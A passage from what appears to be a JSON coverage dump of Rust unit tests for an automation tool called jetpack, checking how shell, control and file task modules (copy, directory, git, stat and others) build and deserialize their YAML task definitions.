serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.cmd, \"date\");\n    assert!(task.name.is_none());\n    assert!(task.save.is_none());\n}\n\n#[test]\nfn test_shell_task_with_logic() {\n    let yaml = r#\"\ncmd: \"{{ install_script }}\"\nsave: install_result\nunsafe: \"yes\"\nwith:\n  condition: \"{{ needs_installation }}\"\nand:\n  notify: \"restart_app\"\n\"#;\n\n    let task: Result\u003cShellTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.cmd.contains(\"{{ install_script }}\"));\n    assert!(task.save.is_some());\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}\n\n#[test]\nfn test_shell_task_with_save_and_conditions() {\n    let yaml = r#\"\nname: Check application status\ncmd: \"/opt/myapp/bin/status.sh\"\nsave: app_status\nfailed_when: \"'ERROR' in stdout\"\nchanged_when: \"'RESTARTED' in stdout\"\n\"#;\n\n    let task: Result\u003cShellTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.save, Some(\"app_status\".to_string()));\n    assert!(task.failed_when.unwrap().contains(\"stdout\"));\n    assert!(task.changed_when.unwrap().contains(\"stdout\"));\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","control","assert.rs"],"content":"use jetpack::modules::control::assert::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_assert_task_basic() {\n    let task = AssertTask {\n        name: Some(\"Test Assert\".to_string()),\n        msg: Some(\"Test message\".to_string()),\n        r#true: Some(\"{{ test_true }}\".to_string()),\n        r#false: None,\n        all_true: None,\n        all_false: None,\n        some_true: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"assert\");\n    assert_eq!(task.get_name(), Some(\"Test Assert\".to_string()));\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_assert_task_with_lists() {\n    let task = AssertTask {\n        name: None,\n        msg: None,\n        r#true: None,\n        r#false: None,\n        all_true: Some(vec![\"{{ test_true }}\".to_string(), \"{{ 1 == 1 }}\".to_string()]),\n        all_false: Some(vec![\"{{ test_false }}\".to_string(), \"{{ 1 == 2 }}\".to_string()]),\n        some_true: Some(vec![\"{{ test_false }}\".to_string(), \"{{ test_true }}\".to_string()]),\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"assert\");\n    assert!(task.all_true.is_some());\n    assert!(task.all_false.is_some());\n    assert!(task.some_true.is_some());\n}\n\n#[test]\nfn test_assert_task_deserialization() {\n    let yaml = r#\"\nname: Test Assert\nmsg: Test assertion\ntrue: \"{{ test_var == 42 }}\"\nfalse: \"{{ test_var == 0 }}\"\n\"#;\n\n    let task: Result\u003cAssertTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Test Assert\".to_string()));\n    assert_eq!(task.msg, Some(\"Test assertion\".to_string()));\n    assert!(task.r#true.is_some());\n    assert!(task.r#false.is_some());\n}\n\n#[test]\nfn test_assert_task_deserialization_with_lists() {\n    let yaml = r#\"\nall_true:\n  - \"{{ condition1 }}\"\n  - \"{{ condition2 }}\"\nall_false:\n  - \"{{ bad1 }}\"\n  - \"{{ bad2 }}\"\nsome_true:\n  - \"{{ maybe1 }}\"\n  - \"{{ maybe2 }}\"\n\"#;\n\n    let task: Result\u003cAssertTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.all_true.as_ref().unwrap().len(), 2);\n    assert_eq!(task.all_false.as_ref().unwrap().len(), 2);\n    assert_eq!(task.some_true.as_ref().unwrap().len(), 2);\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","control","debug.rs"],"content":"use jetpack::modules::control::debug::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_debug_task_basic() {\n    let task = DebugTask {\n        name: Some(\"Test Debug\".to_string()),\n        vars: Some(vec![\"test_var\".to_string()]),\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"debug\");\n    assert_eq!(task.get_name(), Some(\"Test Debug\".to_string()));\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_debug_task_no_vars() {\n    let task = DebugTask {\n        name: None,\n        vars: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"debug\");\n    assert_eq!(task.get_name(), None);\n    assert!(task.vars.is_none());\n}\n\n#[test]\nfn test_debug_task_deserialization() {\n    let yaml = r#\"\nname: Test Debug\nvars:\n  - var1\n  - var2\n\"#;\n\n    let task: Result\u003cDebugTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Test Debug\".to_string()));\n    assert_eq!(task.vars, Some(vec![\"var1\".to_string(), \"var2\".to_string()]));\n}\n\n#[test]\nfn test_debug_task_deserialization_minimal() {\n    let yaml = r#\"\nvars:\n\"#;\n\n    let task: Result\u003cDebugTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.name.is_none());\n    assert!(task.vars.is_none());\n}\n\n#[test]\nfn test_debug_task_with_logic() {\n    let yaml = r#\"\nvars:\n  - debug_var\nwith:\n  condition: \"{{ debug_enabled }}\"\nand:\n  retry: \"3\"\n\"#;\n\n    let task: Result\u003cDebugTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","control","echo.rs"],"content":"use jetpack::modules::control::echo::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_echo_task_basic() {\n    let task = EchoTask {\n        name: Some(\"Test Echo\".to_string()),\n        msg: \"Hello, World!\".to_string(),\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"echo\");\n    assert_eq!(task.get_name(), Some(\"Test Echo\".to_string()));\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_echo_task_with_template() {\n    let task = EchoTask {\n        name: None,\n        msg: \"Value is: {{ test_var }}\".to_string(),\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"echo\");\n    assert_eq!(task.get_name(), None);\n}\n\n#[test]\nfn test_echo_task_deserialization() {\n    let yaml = r#\"\nname: Test Echo\nmsg: Hello from YAML\n\"#;\n\n    let task: Result\u003cEchoTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Test Echo\".to_string()));\n    assert_eq!(task.msg, \"Hello from YAML\");\n}\n\n#[test]\nfn test_echo_task_with_logic() {\n    let yaml = r#\"\nmsg: Conditional echo\nwith:\n  condition: \"{{ some_condition }}\"\nand:\n  ignore_errors: \"yes\"\n\"#;\n\n    let task: Result\u003cEchoTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","control","facts.rs"],"content":"use jetpack::modules::control::facts::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_facts_task_basic() {\n    let task = FactsTask {\n        name: Some(\"Test Facts\".to_string()),\n        facter: Some(\"true\".to_string()),\n        ohai: Some(\"false\".to_string()),\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"facts\");\n    assert_eq!(task.get_name(), Some(\"Test Facts\".to_string()));\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_facts_task_defaults() {\n    let task = FactsTask {\n        name: None,\n        facter: None,\n        ohai: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"facts\");\n    assert_eq!(task.get_name(), None);\n    assert!(task.facter.is_none());\n    assert!(task.ohai.is_none());\n}\n\n#[test]\nfn test_facts_task_deserialization() {\n    let yaml = r#\"\nname: Gather Facts\nfacter: \"yes\"\nohai: \"no\"\n\"#;\n\n    let task: Result\u003cFactsTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Gather Facts\".to_string()));\n    assert_eq!(task.facter, Some(\"yes\".to_string()));\n    assert_eq!(task.ohai, Some(\"no\".to_string()));\n}\n\n#[test]\nfn test_facts_task_deserialization_minimal() {\n    let yaml = r#\"\nfacter:\n\"#;\n\n    let task: Result\u003cFactsTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.name.is_none());\n    assert!(task.facter.is_none());\n    assert!(task.ohai.is_none());\n}\n\n#[test]\nfn test_facts_task_with_logic() {\n    let yaml = r#\"\nfacter: \"true\"\nwith:\n  condition: \"{{ gather_external_facts }}\"\nand:\n  delay: \"2\"\n\"#;\n\n    let task: Result\u003cFactsTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","control","fail.rs"],"content":"use jetpack::modules::control::fail::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_fail_task_basic() {\n    let task = FailTask {\n        name: Some(\"Test Fail\".to_string()),\n        msg: Some(\"Custom failure message\".to_string()),\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"fail\");\n    assert_eq!(task.get_name(), Some(\"Test Fail\".to_string()));\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_fail_task_no_message() {\n    let task = FailTask {\n        name: None,\n        msg: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"fail\");\n    assert_eq!(task.get_name(), None);\n    assert!(task.msg.is_none());\n}\n\n#[test]\nfn test_fail_task_deserialization() {\n    let yaml = r#\"\nname: Test Fail\nmsg: \"Something went wrong\"\n\"#;\n\n    let task: Result\u003cFailTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Test Fail\".to_string()));\n    assert_eq!(task.msg, Some(\"Something went wrong\".to_string()));\n}\n\n#[test]\nfn test_fail_task_deserialization_minimal() {\n    let yaml = r#\"\nmsg:\n\"#;\n\n    let task: Result\u003cFailTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.name.is_none());\n    assert!(task.msg.is_none());\n}\n\n#[test]\nfn test_fail_task_with_logic() {\n    let yaml = r#\"\nmsg: \"Failed when condition met\"\nwith:\n  condition: \"{{ error_occurred }}\"\nand:\n  ignore_errors: \"no\"\n\"#;\n\n    let task: Result\u003cFailTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","control","mod.rs"],"content":"mod echo;\nmod debug;\nmod assert;\nmod fail;\nmod set;\nmod facts;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","control","set.rs"],"content":"use jetpack::modules::control::set::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_set_task_basic() {\n    let mut vars = serde_yaml::Mapping::new();\n    vars.insert(\n        serde_yaml::Value::String(\"new_var\".to_string()),\n        serde_yaml::Value::String(\"new_value\".to_string()),\n    );\n\n    let task = SetTask {\n        name: Some(\"Test Set\".to_string()),\n        vars: Some(vars),\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"Set\");\n    assert_eq!(task.get_name(), Some(\"Test Set\".to_string()));\n    assert!(task.get_with().is_none());\n    assert!(task.vars.is_some());\n}\n\n#[test]\nfn test_set_task_no_vars() {\n    let task = SetTask {\n        name: None,\n        vars: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"Set\");\n    assert_eq!(task.get_name(), None);\n    assert!(task.vars.is_none());\n}\n\n#[test]\nfn test_set_task_deserialization() {\n    let yaml = r#\"\nname: Set Variables\nvars:\n  var1: value1\n  var2: \"{{ computed_value }}\"\n  var3: 123\n\"#;\n\n    let task: Result\u003cSetTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Set Variables\".to_string()));\n    assert!(task.vars.is_some());\n    assert_eq!(task.vars.as_ref().unwrap().len(), 3);\n}\n\n#[test]\nfn test_set_task_deserialization_empty() {\n    let yaml = r#\"\nvars:\n\"#;\n\n    let task: Result\u003cSetTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.name.is_none());\n    assert!(task.vars.is_none());\n}\n\n#[test]\nfn test_set_task_with_logic() {\n    let yaml = r#\"\nvars:\n  conditional_var: \"conditional_value\"\nwith:\n  condition: \"{{ should_set }}\"\nand:\n  notify: \"handler_name\"\n\"#;\n\n    let task: Result\u003cSetTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","files","copy.rs"],"content":"use jetpack::modules::files::copy::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_copy_task_basic() {\n    let task = CopyTask {\n        name: Some(\"Copy config file\".to_string()),\n        src: \"files/app.conf\".to_string(),\n        dest: \"/etc/app/app.conf\".to_string(),\n        attributes: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"copy\");\n    assert_eq!(task.get_name(), Some(\"Copy config file\".to_string()));\n    assert_eq!(task.src, \"files/app.conf\");\n    assert_eq!(task.dest, \"/etc/app/app.conf\");\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_copy_task_with_attributes() {\n    let attrs = FileAttributesInput {\n        owner: Some(\"app\".to_string()),\n        group: Some(\"app\".to_string()),\n        mode: Some(\"0600\".to_string()),\n    };\n\n    let task = CopyTask {\n        name: None,\n        src: \"secrets/api_key\".to_string(),\n        dest: \"/opt/app/config/api_key\".to_string(),\n        attributes: Some(attrs),\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"copy\");\n    assert!(task.attributes.is_some());\n    let attrs = task.attributes.as_ref().unwrap();\n    assert_eq!(attrs.owner, Some(\"app\".to_string()));\n    assert_eq!(attrs.mode, Some(\"0600\".to_string()));\n}\n\n#[test]\nfn test_copy_task_deserialization() {\n    let yaml = r#\"\nname: Deploy application config\nsrc: files/production.conf\ndest: /etc/myapp/config.conf\nattributes:\n  owner: myapp\n  group: myapp\n  mode: \"0644\"\n\"#;\n\n    let task: Result\u003cCopyTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Deploy application config\".to_string()));\n    assert_eq!(task.src, \"files/production.conf\");\n    assert_eq!(task.dest, \"/etc/myapp/config.conf\");\n    assert!(task.attributes.is_some());\n}\n\n#[test]\nfn test_copy_task_deserialization_minimal() {\n    let yaml = r#\"\nsrc: README.md\ndest: /tmp/README.md\n\"#;\n\n    let task: Result\u003cCopyTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.src, \"README.md\");\n    assert_eq!(task.dest, \"/tmp/README.md\");\n    assert!(task.name.is_none());\n    assert!(task.attributes.is_none());\n}\n\n#[test]\nfn test_copy_task_with_logic() {\n    let yaml = r#\"\nsrc: \"files/{{ env }}.conf\"\ndest: /etc/app/config.conf\nwith:\n  condition: \"{{ deploy_config }}\"\nand:\n  notify: \"reload_app\"\n\"#;\n\n    let task: Result\u003cCopyTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","files","directory.rs"],"content":"use jetpack::modules::files::directory::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_directory_task_basic() {\n    let task = DirectoryTask {\n        name: Some(\"Test Directory\".to_string()),\n        path: \"/tmp/testdir\".to_string(),\n        remove: None,\n        recurse: None,\n        attributes: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"directory\");\n    assert_eq!(task.get_name(), Some(\"Test Directory\".to_string()));\n    assert_eq!(task.path, \"/tmp/testdir\");\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_directory_task_with_recurse() {\n    let task = DirectoryTask {\n        name: None,\n        path: \"/var/www\".to_string(),\n        remove: None,\n        recurse: Some(\"yes\".to_string()),\n        attributes: Some(FileAttributesInput {\n            owner: Some(\"www-data\".to_string()),\n            group: Some(\"www-data\".to_string()),\n            mode: Some(\"0755\".to_string()),\n        }),\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"directory\");\n    assert!(task.recurse.is_some());\n    assert!(task.attributes.is_some());\n}\n\n#[test]\nfn test_directory_task_remove() {\n    let task = DirectoryTask {\n        name: Some(\"Remove directory\".to_string()),\n        path: \"/tmp/old_dir\".to_string(),\n        remove: Some(\"yes\".to_string()),\n        recurse: Some(\"yes\".to_string()),\n        attributes: None,\n        with: None,\n        and: None,\n    };\n\n    assert!(task.remove.is_some());\n    assert!(task.recurse.is_some());\n}\n\n#[test]\nfn test_directory_task_deserialization() {\n    let yaml = r#\"\nname: Create web directory\npath: /var/www/html\nrecurse: \"yes\"\nattributes:\n  owner: www-data\n  group: www-data\n  mode: \"0755\"\n\"#;\n\n    let task: Result\u003cDirectoryTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Create web directory\".to_string()));\n    assert_eq!(task.path, \"/var/www/html\");\n    assert_eq!(task.recurse, Some(\"yes\".to_string()));\n    assert!(task.attributes.is_some());\n}\n\n#[test]\nfn test_directory_task_deserialization_minimal() {\n    let yaml = r#\"\npath: /tmp/simple_dir\n\"#;\n\n    let task: Result\u003cDirectoryTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.path, \"/tmp/simple_dir\");\n    assert!(task.remove.is_none());\n    assert!(task.recurse.is_none());\n}\n\n#[test]\nfn test_directory_task_with_logic() {\n    let yaml = r#\"\npath: /opt/app/logs\nrecurse: \"yes\"\nwith:\n  condition: \"{{ app_installed }}\"\nand:\n  notify: \"restart_app\"\n\"#;\n\n    let task: Result\u003cDirectoryTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","files","file.rs"],"content":"use jetpack::modules::files::file::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_file_task_basic() {\n    let task = FileTask {\n        name: Some(\"Test File\".to_string()),\n        path: \"/tmp/test.txt\".to_string(),\n        remove: None,\n        attributes: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"file\");\n    assert_eq!(task.get_name(), Some(\"Test File\".to_string()));\n    assert_eq!(task.path, \"/tmp/test.txt\");\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_file_task_with_remove() {\n    let task = FileTask {\n        name: None,\n        path: \"/tmp/remove_me.txt\".to_string(),\n        remove: Some(\"yes\".to_string()),\n        attributes: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"file\");\n    assert!(task.remove.is_some());\n}\n\n#[test]\nfn test_file_task_with_attributes() {\n    let attrs = FileAttributesInput {\n        owner: Some(\"user\".to_string()),\n        group: Some(\"group\".to_string()),\n        mode: Some(\"0644\".to_string()),\n    };\n\n    let task = FileTask {\n        name: Some(\"File with attrs\".to_string()),\n        path: \"/etc/config.conf\".to_string(),\n        remove: None,\n        attributes: Some(attrs),\n        with: None,\n        and: None,\n    };\n\n    assert!(task.attributes.is_some());\n    assert_eq!(task.attributes.as_ref().unwrap().owner, Some(\"user\".to_string()));\n}\n\n#[test]\nfn test_file_task_deserialization() {\n    let yaml = r#\"\nname: Create test file\npath: /tmp/test.txt\nattributes:\n  owner: root\n  group: root\n  mode: \"0644\"\n\"#;\n\n    let task: Result\u003cFileTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Create test file\".to_string()));\n    assert_eq!(task.path, \"/tmp/test.txt\");\n    assert!(task.attributes.is_some());\n}\n\n#[test]\nfn test_file_task_deserialization_remove() {\n    let yaml = r#\"\npath: /tmp/delete_me.txt\nremove: \"yes\"\n\"#;\n\n    let task: Result\u003cFileTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.path, \"/tmp/delete_me.txt\");\n    assert_eq!(task.remove, Some(\"yes\".to_string()));\n}\n\n#[test]\nfn test_file_task_with_logic() {\n    let yaml = r#\"\npath: /tmp/conditional.txt\nwith:\n  condition: \"{{ create_file }}\"\nand:\n  notify: \"file_created\"\n\"#;\n\n    let task: Result\u003cFileTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","files","git.rs"],"content":"use jetpack::modules::files::git::*;\nuse jetpack::tasks::*;\nuse std::collections::HashMap;\n\n#[test]\nfn test_git_task_basic() {\n    let task = GitTask {\n        name: Some(\"Clone repository\".to_string()),\n        repo: \"https://github.com/example/repo.git\".to_string(),\n        path: \"/opt/myapp\".to_string(),\n        branch: None,\n        ssh_options: None,\n        accept_keys: None,\n        update: None,\n        attributes: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"git\");\n    assert_eq!(task.get_name(), Some(\"Clone repository\".to_string()));\n    assert_eq!(task.repo, \"https://github.com/example/repo.git\");\n    assert_eq!(task.path, \"/opt/myapp\");\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_git_task_with_branch() {\n    let task = GitTask {\n        name: None,\n        repo: \"git@github.com:example/private-repo.git\".to_string(),\n        path: \"/var/lib/app\".to_string(),\n        branch: Some(\"develop\".to_string()),\n        ssh_options: None,\n        accept_keys: Some(\"yes\".to_string()),\n        update: Some(\"yes\".to_string()),\n        attributes: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"git\");\n    assert!(task.branch.is_some());\n    assert_eq!(task.branch.unwrap(), \"develop\");\n    assert!(task.accept_keys.is_some());\n}\n\n#[test]\nfn test_git_task_with_ssh_options() {\n    let mut ssh_opts = HashMap::new();\n    ssh_opts.insert(\"IdentityFile\".to_string(), \"~/.ssh/deploy_key\".to_string());\n    ssh_opts.insert(\"Port\".to_string(), \"2222\".to_string());\n\n    let task = GitTask {\n        name: Some(\"Clone with SSH options\".to_string()),\n        repo: \"git@gitlab.com:company/project.git\".to_string(),\n        path: \"/opt/project\".to_string(),\n        branch: Some(\"main\".to_string()),\n        ssh_options: Some(ssh_opts),\n        accept_keys: Some(\"no\".to_string()),\n        update: None,\n        attributes: None,\n        with: None,\n        and: None,\n    };\n\n    assert!(task.ssh_options.is_some());\n    let opts = task.ssh_options.unwrap();\n    assert_eq!(opts.get(\"IdentityFile\"), Some(\u0026\"~/.ssh/deploy_key\".to_string()));\n    assert_eq!(opts.get(\"Port\"), Some(\u0026\"2222\".to_string()));\n}\n\n#[test]\nfn test_git_task_with_attributes() {\n    let attrs = FileAttributesInput {\n        owner: Some(\"deploy\".to_string()),\n        group: Some(\"deploy\".to_string()),\n        mode: Some(\"0755\".to_string()),\n    };\n\n    let task = GitTask {\n        name: None,\n        repo: \"https://github.com/public/repo.git\".to_string(),\n        path: \"/srv/app\".to_string(),\n        branch: None,\n        ssh_options: None,\n        accept_keys: None,\n        update: Some(\"no\".to_string()),\n        attributes: Some(attrs),\n        with: None,\n        and: None,\n    };\n\n    assert!(task.attributes.is_some());\n    let attrs = task.attributes.as_ref().unwrap();\n    assert_eq!(attrs.owner, Some(\"deploy\".to_string()));\n}\n\n#[test]\nfn test_git_task_deserialization() {\n    let yaml = r#\"\nname: Deploy application code\nrepo: https://github.com/mycompany/myapp.git\npath: /opt/myapp\nbranch: production\nupdate: \"yes\"\nattributes:\n  owner: app\n  group: app\n  mode: \"0755\"\n\"#;\n\n    let task: Result\u003cGitTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Deploy application code\".to_string()));\n    assert_eq!(task.repo, \"https://github.com/mycompany/myapp.git\");\n    assert_eq!(task.path, \"/opt/myapp\");\n    assert_eq!(task.branch, Some(\"production\".to_string()));\n    assert_eq!(task.update, Some(\"yes\".to_string()));\n    assert!(task.attributes.is_some());\n}\n\n#[test]\nfn test_git_task_deserialization_minimal() {\n    let yaml = r#\"\nrepo: https://github.com/simple/repo.git\npath: /tmp/simple-repo\n\"#;\n\n    let task: Result\u003cGitTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.repo, \"https://github.com/simple/repo.git\");\n    assert_eq!(task.path, \"/tmp/simple-repo\");\n    assert!(task.branch.is_none());\n}\n\n#[test]\nfn test_git_task_with_logic() {\n    let yaml = r#\"\nrepo: \"{{ git_repo_url }}\"\npath: \"/opt/{{ app_name }}\"\nbranch: \"{{ git_branch | default('main') }}\"\nwith:\n  condition: \"{{ deploy_code }}\"\nand:\n  notify: \"restart_application\"\n\"#;\n\n    let task: Result\u003cGitTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.repo.contains(\"{{ git_repo_url }}\"));\n    assert!(task.path.contains(\"{{ app_name }}\"));\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}\n\n#[test]\nfn test_git_task_ssh_with_options() {\n    let yaml = r#\"\nrepo: git@github.com:private/secure-repo.git\npath: /secure/location\nbranch: main\naccept_keys: \"yes\"\nssh_options:\n  IdentityFile: \"/home/deploy/.ssh/id_rsa\"\n  UserKnownHostsFile: \"/home/deploy/.ssh/known_hosts\"\n  StrictHostKeyChecking: \"no\"\n\"#;\n\n    let task: Result\u003cGitTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.ssh_options.is_some());\n    let opts = task.ssh_options.unwrap();\n    assert_eq!(opts.len(), 3);\n    assert_eq!(opts.get(\"IdentityFile\"), Some(\u0026\"/home/deploy/.ssh/id_rsa\".to_string()));\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","files","mod.rs"],"content":"mod file;\nmod directory;\nmod copy;\nmod template;\nmod stat;\nmod git;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","files","stat.rs"],"content":"use jetpack::modules::files::stat::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_stat_task_basic() {\n    let task = StatTask {\n        name: Some(\"Check file status\".to_string()),\n        path: \"/etc/passwd\".to_string(),\n        save: \"passwd_stat\".to_string(),\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"stat\");\n    assert_eq!(task.get_name(), Some(\"Check file status\".to_string()));\n    assert_eq!(task.path, \"/etc/passwd\");\n    assert_eq!(task.save, \"passwd_stat\");\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_stat_task_with_logic() {\n    let pre_logic = PreLogicInput {\n        condition: Some(\"{{ check_files }}\".to_string()),\n        subscribe: None,\n        sudo: None,\n        items: None,\n        tags: None,\n        delegate_to: None,\n    };\n\n    let post_logic = PostLogicInput {\n        notify: Some(\"file_checked\".to_string()),\n        ignore_errors: None,\n        retry: None,\n        delay: None,\n    };\n\n    let task = StatTask {\n        name: None,\n        path: \"/tmp/important.txt\".to_string(),\n        save: \"important_file_stat\".to_string(),\n        with: Some(pre_logic),\n        and: Some(post_logic),\n    };\n\n    assert_eq!(task.get_module(), \"stat\");\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}\n\n#[test]\nfn test_stat_task_deserialization() {\n    let yaml = r#\"\nname: Check application directory\npath: /opt/myapp\nsave: app_dir_stat\n\"#;\n\n    let task: Result\u003cStatTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Check application directory\".to_string()));\n    assert_eq!(task.path, \"/opt/myapp\");\n    assert_eq!(task.save, \"app_dir_stat\");\n}\n\n#[test]\nfn test_stat_task_deserialization_minimal() {\n    let yaml = r#\"\npath: 